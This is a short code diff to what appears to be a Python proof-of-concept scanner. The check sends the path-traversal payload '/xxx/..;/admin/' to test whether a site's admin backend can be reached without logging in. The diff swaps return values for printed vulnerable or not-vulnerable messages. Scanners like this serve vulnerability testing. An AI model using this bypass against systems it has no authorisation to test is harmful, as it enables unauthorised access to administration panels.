@@ -20,6 +20,7 @@ class POC:
     pocDesc = '''通过访问http://127.0.0.1:8080/xxx/..;/admin/可绕过登陆界面，直接访问网站后台'''#在PoC用法描述填写
 
     def scanner(url):
+        target = url
         head = config.Pack
         payload = '/xxx/..;/admin/'
         if re.match('/$',url):
@@ -28,11 +29,11 @@ class POC:
         try:
             response = requests.get(url,headers=head)
             if response.status_code == 200:
-                return True
+                print(target+' have this loop')
             else:
-                return False
+                print(target+' do not have this loop')
         except:
-            print('error')
+            print(target+' is error')
        
 
     def attack():
